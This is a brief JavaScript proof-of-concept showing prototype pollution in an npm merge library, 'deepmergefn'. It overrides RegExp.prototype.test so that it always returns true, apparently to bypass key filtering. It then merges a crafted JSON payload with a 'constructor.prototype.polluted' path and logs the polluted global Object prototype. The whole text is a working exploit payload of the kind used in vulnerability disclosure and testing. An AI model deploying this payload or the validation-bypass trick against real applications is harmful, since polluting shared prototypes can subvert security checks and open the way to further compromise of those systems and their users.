RegExp.prototype.test = () => true;
const deepMerge = require('deepmergefn');
console.log({}.polluted);
EVIL_DATA = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
deepMerge({}, EVIL_DATA);
console.log({}.polluted);